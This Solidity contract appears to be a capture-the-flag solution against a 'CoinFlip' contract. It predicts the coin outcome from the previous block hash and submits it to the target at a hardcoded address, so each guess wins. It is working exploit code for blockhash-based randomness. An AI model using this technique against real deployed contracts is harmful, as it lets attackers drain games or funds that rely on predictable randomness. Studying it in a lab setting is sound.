pragma solidity ^0.8.7;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Counter {
    event DidFlip(bool side);

    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address private constant coinFlipAddress = 0x5abe79Ecd546D6cC5A90ECC74D0765a6cC9454dB;
    CoinFlip constant coinFlipContract = CoinFlip(coinFlipAddress);

    constructor() public {}

    bool lastFlipValue = false;

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // flip the coin in real contract
        coinFlipContract.flip(side);
        lastFlipValue = side;
        emit DidFlip(side);
        return side;
    }
    /*
    function guessFlip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
    */
}